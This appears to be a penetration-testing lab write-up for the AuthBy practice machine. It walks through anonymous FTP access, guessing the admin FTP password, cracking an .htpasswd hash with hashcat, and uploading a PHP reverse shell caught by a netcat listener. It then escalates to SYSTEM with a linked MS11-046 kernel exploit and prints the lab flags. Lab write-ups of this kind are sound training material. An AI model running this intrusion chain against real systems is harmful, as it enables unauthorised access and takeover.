# Authby

Nmap: 

```html
┌──(kali㉿kali)-[~/OSCP/Labs/PracticeGrounds/AuthBy]
└─$ sudo nmap -sV -sC -p-10000 192.168.144.46 -o nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 13:26 AEDT
Nmap scan report for 192.168.144.46
Host is up (0.27s latency).
Not shown: 9996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jan 20 10:25 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Oct 11 01:16 accounts
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2026-01-20T02:28:14+00:00
|_ssl-date: 2026-01-20T02:28:20+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2025-10-09T17:16:18
|_Not valid after:  2026-04-10T17:16:18
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Ports/services open: 

```html
FTP 21
HTTP 242
FTP Admin 3145
ms-wbt-server 3389
```

Port 21: 

```html
Anonymous login allowed 

FTP contents: 
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Jan 20 10:25 log
----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Oct 11 01:16 accounts
226 Closing data connection.
ftp> 

Looks like theres three accounts: 
	- Offsec 
	- anonymous
	- admin

150 Opening connection for /bin/ls.
total 4
----------   1 root     root          764 Jul 10  2020 acc[Offsec].uac
----------   1 root     root         1030 Jul 10  2020 acc[anonymous].uac
----------   1 root     root          926 Jul 10  2020 acc[admin].uac
226 Closing data connection.

Nothing else in FTP service
```

Port 242: 

![Screenshot 2026-01-20 at 1.31.45 pm.png](Authby/Screenshot_2026-01-20_at_1.31.45_pm.png)

- After finding the users for the ftp server I tried to log into the Offsec and admin account via bruteforce
- I was successful with logging into the admin account using admin as the password

![Screenshot 2026-01-25 at 11.54.23 am.png](Authby/Screenshot_2026-01-25_at_11.54.23_am.png)

Navigated through the files and found the password hash for the Offsec user within the .htpasswd file:

```html
ftp> more .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
ftp> 
```

Looks like this user and pass may be the credentials to enter the website on port 242: 

```html
ftp> more .htaccess
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>
```

Using hashcat we cracked the password: 

```html
root@a58c3d1fcd38:/# hashcat -m 1600 creds.txt rockyou.txt

$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0:elite               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
Time.Started.....: Sun Jan 25 01:17:20 2026 (11 secs)
Time.Estimated...: Sun Jan 25 01:17:31 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   155.0 kH/s (6.74ms) @ Accel:32 Loops:62 Thr:128 Vec:1
Speed.#2.........:     3534 H/s (28.50ms) @ Accel:384 Loops:3 Thr:1 Vec:16
Speed.#*.........:   158.5 kH/s
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1069056/14344384 (7.45%)
Rejected.........: 0/1069056 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1000
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:999-1000
Candidate.Engine.: Device Generator
Candidates.#1....: 281960 -> 795138246
Candidates.#2....: 123456 -> holabebe
Hardware.Mon.#1..: Temp: 33c Fan:  0% Util:  0% Core:1740MHz Mem:7251MHz Bus:16
Hardware.Mon.#2..: Util:  7%

Started: Sun Jan 25 01:17:16 2026
Stopped: Sun Jan 25 01:17:32 2026
root@a58c3d1fcd38:/# 

```

Login successful with credentials Offsec:elite:

![Screenshot 2026-01-25 at 12.21.14 pm.png](Authby/Screenshot_2026-01-25_at_12.21.14_pm.png)

- With the knowledge that we can upload files to the webserver and that we have access to the webservers pages, we can try to upload a php reverse shell to gain a shell.
- Using Ivan Sincek PHP reverse shell I uploaded a file via FTP and executed it via http using the compromised users credentials for Offsec

Gained a webshell: 

```html
┌──(kali㉿kali)-[~/OSCP/Labs/PracticeGrounds/AuthBy]
└─$ nc -lnvp 1234 
listening on [any] 1234 ...
connect to [192.168.45.219] from (UNKNOWN) [192.168.171.46] 49162
SOCKET: Shell has connected! PID: 3128
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.21>dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\wamp\bin\apache\Apache2.2.21

03/30/2020  05:30 AM    <DIR>          .
03/30/2020  05:30 AM    <DIR>          ..
09/26/2011  08:50 AM            15,159 ABOUT_APACHE.txt
11/08/2011  03:37 AM    <DIR>          bin
11/08/2011  03:36 AM    <DIR>          cgi-bin
09/26/2011  08:50 AM           121,134 CHANGES.txt
11/08/2011  03:36 AM    <DIR>          conf
11/08/2011  03:36 AM    <DIR>          error
11/08/2011  03:36 AM    <DIR>          htdocs
11/08/2011  03:36 AM    <DIR>          icons
11/08/2011  03:36 AM    <DIR>          include
09/26/2011  08:50 AM             4,835 INSTALL.txt
11/08/2011  03:36 AM    <DIR>          lib
09/26/2011  08:50 AM            36,679 LICENSE.txt
11/09/2011  05:45 AM    <DIR>          logs
11/08/2011  03:36 AM    <DIR>          manual
11/08/2011  03:36 AM    <DIR>          modules
09/26/2011  08:50 AM             1,323 NOTICE.txt
09/26/2011  08:50 AM            26,498 OPENSSL-NEWS.txt
09/26/2011  08:50 AM            10,734 OPENSSL-README.txt
09/26/2011  08:50 AM             2,608 README-win32.txt
09/26/2011  08:50 AM             6,094 README.txt
12/31/2010  09:39 AM               330 wampserver.conf
03/30/2020  05:30 AM             3,858 wDw00t.xml
              11 File(s)        229,252 bytes
              13 Dir(s)   5,994,860,544 bytes free

C:\wamp\bin\apache\Apache2.2.21>

```

Found the local.txt flag: 

```html

07/09/2020  10:05 AM    <DIR>          .
07/09/2020  10:05 AM    <DIR>          ..
01/24/2026  04:21 PM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)   5,994,860,544 bytes free

C:\Users\apache\Desktop>type local.txt
bc6c41527bd44f0e38a1fd7ddcf04af9

C:\Users\apache\Desktop>

```

Services:

```html
C:\wamp\bin\mysql\mysql5.5.16>wmic service get name,pathname,startmode,state
Name                            PathName                                                                           StartMode  State    
AeLookupSvc                     C:\Windows\system32\svchost.exe -k netsvcs                                         Auto       Running  
ALG                             C:\Windows\System32\alg.exe                                                        Manual     Stopped  
Appinfo                         C:\Windows\system32\svchost.exe -k netsvcs                                         Manual     Stopped  
AppMgmt                         C:\Windows\system32\svchost.exe -k netsvcs                                         Manual     Stopped  
AudioEndpointBuilder            C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                    Manual     Stopped  
Audiosrv                        C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted                   Manual     Stopped  
BFE                             C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork                           Auto       Running  
BITS                            C:\Windows\System32\svchost.exe -k netsvcs                                         Auto       Running  
Browser                         C:\Windows\System32\svchost.exe -k netsvcs                                         Disabled   Stopped  
CertPropSvc                     C:\Windows\system32\svchost.exe -k netsvcs                                         Manual     Running  
clr_optimization_v2.0.50727_32  C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe                         Manual     Stopped  
COMSysApp                       C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}  Manual     Running  
CryptSvc                        C:\Windows\system32\svchost.exe -k NetworkService                                  Auto       Running  
CscService                      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                    Disabled   Stopped  
DcomLaunch                      C:\Windows\system32\svchost.exe -k DcomLaunch                                      Auto       Running  
Dhcp                            C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted                   Auto       Running  
Dnscache                        C:\Windows\system32\svchost.exe -k NetworkService                                  Auto       Running  
dot3svc                         C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                    Manual     Stopped  
DPS                             C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork                           Auto       Running  
EapHost                         C:\Windows\System32\svchost.exe -k netsvcs                                         Manual     Stopped  
EventLog                        C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted                   Auto       Running  
EventSystem                     C:\Windows\system32\svchost.exe -k LocalService                                    Auto       Running  
FCRegSvc                        C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted                   Manual     Stopped  
fdPHost                         C:\Windows\system32\svchost.exe -k LocalService                                    Manual     Stopped  
FDResPub                        C:\Windows\system32\svchost.exe -k LocalService                                    Auto       Running  
gpsvc                           C:\Windows\system32\svchost.exe -k GPSvcGroup                                      Auto       Running  
hidserv                         C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                    Manual     Stopped  
hkmsvc                          C:\Windows\System32\svchost.exe -k netsvcs                                         Manual     Stopped  
IKEEXT                          C:\Windows\system32\svchost.exe -k netsvcs                                         Auto       Running  
iphlpsvc                        C:\Windows\System32\svchost.exe -k NetSvcs                                         Auto       Running  
KeyIso                          C:\Windows\system32\lsass.exe                                                      Manual     Stopped  
KtmRm                           C:\Windows\System32\svchost.exe -k NetworkService                                  Auto       Running  
LanmanServer                    C:\Windows\system32\svchost.exe -k netsvcs                                         Auto       Running  
LanmanWorkstation               C:\Windows\System32\svchost.exe -k LocalService                                    Auto       Running  
lltdsvc                         C:\Windows\System32\svchost.exe -k LocalService                                    Manual     Stopped  
lmhosts                         C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted                   Auto       Running  
MMCSS                           C:\Windows\system32\svchost.exe -k netsvcs                                         Manual     Stopped  
MpsSvc                          C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork                           Auto       Running  
MSDTC                           C:\Windows\System32\msdtc.exe                                                      Auto       Running  
MSiSCSI                         C:\Windows\system32\svchost.exe -k netsvcs                                         Manual     Stopped  
msiserver                       C:\Windows\system32\msiexec /V                                                     Manual     Stopped  
napagent                        C:\Windows\System32\svchost.exe -k NetworkService                                  Manual     Stopped  
Netlogon                        C:\Windows\system32\lsass.exe                                                      Manual     Stopped  
Netman                          C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                    Manual     Running  
netprofm                        C:\Windows\System32\svchost.exe -k LocalService                                    Auto       Running  
NlaSvc                          C:\Windows\System32\svchost.exe -k NetworkService                                  Auto       Running  
nsi                             C:\Windows\system32\svchost.exe -k LocalService                                    Auto       Running  
pla                             C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork                           Manual     Stopped  
PlugPlay                        C:\Windows\system32\svchost.exe -k DcomLaunch                                      Auto       Running  
PolicyAgent                     C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted                 Auto       Running  
ProfSvc                         C:\Windows\system32\svchost.exe -k netsvcs                                         Auto       Running  
ProtectedStorage                C:\Windows\system32\lsass.exe                                                      Manual     Stopped  
RasAuto                         C:\Windows\System32\svchost.exe -k netsvcs                                         Manual     Stopped  
RasMan                          C:\Windows\System32\svchost.exe -k netsvcs                                         Manual     Stopped  
RemoteAccess                    C:\Windows\System32\svchost.exe -k netsvcs                                         Disabled   Stopped  
RemoteRegistry                  C:\Windows\system32\svchost.exe -k regsvc                                          Auto       Running  
RpcLocator                      C:\Windows\system32\locator.exe                                                    Manual     Stopped  
RpcSs                           C:\Windows\system32\svchost.exe -k rpcss                                           Auto       Running  
RSoPProv                        C:\Windows\system32\RSoPProv.exe                                                   Manual     Stopped  
sacsvr                          C:\Windows\System32\svchost.exe -k netsvcs                                         Manual     Stopped  
SamSs                           C:\Windows\system32\lsass.exe                                                      Auto       Running  
SCardSvr                        C:\Windows\system32\svchost.exe -k LocalService                                    Manual     Stopped  
Schedule                        C:\Windows\system32\svchost.exe -k netsvcs                                         Auto       Running  
SCPolicySvc                     C:\Windows\system32\svchost.exe -k netsvcs                                         Manual     Stopped  
seclogon                        C:\Windows\system32\svchost.exe -k netsvcs                                         Auto       Running  
SENS                            C:\Windows\system32\svchost.exe -k netsvcs                                         Auto       Running  
SessionEnv                      C:\Windows\System32\svchost.exe -k netsvcs                                         Manual     Running  
SharedAccess                    C:\Windows\System32\svchost.exe -k netsvcs                                         Disabled   Stopped  
ShellHWDetection                C:\Windows\System32\svchost.exe -k netsvcs                                         Auto       Running  
slsvc                           C:\Windows\system32\SLsvc.exe                                                      Auto       Running  
SLUINotify                      C:\Windows\system32\svchost.exe -k LocalService                                    Manual     Stopped  
SNMPTRAP                        C:\Windows\System32\snmptrap.exe                                                   Manual     Stopped  
Spooler                         C:\Windows\System32\spoolsv.exe                                                    Auto       Running  
SstpSvc                         C:\Windows\system32\svchost.exe -k LocalService                                    Manual     Stopped  
swprv                           C:\Windows\System32\svchost.exe -k swprv                                           Manual     Stopped  
SysMain                         C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                    Disabled   Stopped  
TapiSrv                         C:\Windows\System32\svchost.exe -k tapisrv                                         Manual     Stopped  
TBS                             C:\Windows\System32\svchost.exe -k LocalService                                    Auto       Stopped  
TermService                     C:\Windows\System32\svchost.exe -k NetworkService                                  Auto       Running  
Themes                          C:\Windows\System32\svchost.exe -k netsvcs                                         Disabled   Stopped  
THREADORDER                     C:\Windows\system32\svchost.exe -k LocalService                                    Manual     Stopped  
TPAutoConnSvc                   "C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe"                           Manual     Stopped  
TPVCGateway                     "C:\Program Files\VMware\VMware Tools\TPVCGateway.exe"                             Manual     Stopped  
TrkWks                          C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                    Auto       Running  
TrustedInstaller                C:\Windows\servicing\TrustedInstaller.exe                                          Manual     Stopped  
UI0Detect                       C:\Windows\system32\UI0Detect.exe                                                  Manual     Stopped  
UmRdpService                    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                    Manual     Running  
UxSms                           C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                    Auto       Running  
vds                             C:\Windows\System32\vds.exe                                                        Manual     Stopped  
VMTools                         "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                Auto       Running  
vmvss                           C:\Windows\system32\dllhost.exe /Processid:{959F0EA6-16B6-4437-B2EB-1D99D97CA596}  Manual     Stopped  
VSS                             C:\Windows\system32\vssvc.exe                                                      Manual     Stopped  
W32Time                         C:\Windows\system32\svchost.exe -k LocalService                                    Auto       Running  
wampapache                      "c:\wamp\bin\apache\apache2.2.21\bin\httpd.exe" -k runservice                      Auto       Running  
wampmysqld                      c:\wamp\bin\mysql\mysql5.5.16\bin\mysqld.exe wampmysqld                            Auto       Running  
WcsPlugInService                C:\Windows\system32\svchost.exe -k wcssvc                                          Manual     Stopped  
WdiServiceHost                  C:\Windows\System32\svchost.exe -k wdisvc                                          Manual     Stopped  
WdiSystemHost                   C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted                    Manual     Running  
Wecsvc                          C:\Windows\system32\svchost.exe -k NetworkService                                  Manual     Stopped  
wercplsupport                   C:\Windows\System32\svchost.exe -k netsvcs                                         Manual     Stopped  
WerSvc                          C:\Windows\System32\svchost.exe -k WerSvcGroup                                     Auto       Running  
WinHttpAutoProxySvc             C:\Windows\system32\svchost.exe -k LocalService                                    Manual     Stopped  
Winmgmt                         C:\Windows\system32\svchost.exe -k netsvcs                                         Auto       Running  
WinRM                           C:\Windows\System32\svchost.exe -k NetworkService                                  Auto       Running  
wmiApSrv                        C:\Windows\system32\wbem\WmiApSrv.exe                                              Manual     Stopped  
WPDBusEnum                      C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                    Manual     Stopped  
wuauserv                        C:\Windows\system32\svchost.exe -k netsvcs                                         Auto       Running  
wudfsvc                         C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted                    Manual     Stopped  
zFTPSvc                         C:\Program Files\zFTPServer\zFTPServer.exe /service                                Auto       Running  

```

- No services that are vulnerable to Service injection, DLL hijacking, unquoted service path or scheduled tasks

Only 3 users on host: 

```html
c:\Users\Administrator\Desktop>type proof.txt
d4bef78ea0e32b43a5a7fc9c8015c24f

c:\Users\Administrator\Desktop>net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            apache                   Guest                    
The command completed with one or more errors.

c:\Users\Administrator\Desktop>

```

- All users are in standard groups

Systeminfo: 

```html
c:\Users\Administrator\Desktop>systeminfo

Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
```

- After looking up the OS version for the host, I found that it has a known priv esc vuln **ms11-046**

- The host also has no current security patches installed

- I found a repo on github for the exploit:

[https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe)

![Screenshot 2026-02-01 at 1.07.20 pm.png](Authby/Screenshot_2026-02-01_at_1.07.20_pm.png)

After downloading the exploit to the host and executing it, our privileges were elevated to nt authority\system

I was then able to navigate to the administrator directory and retrieve the flag:

![Screenshot 2026-02-01 at 1.08.05 pm.png](Authby/Screenshot_2026-02-01_at_1.08.05_pm.png)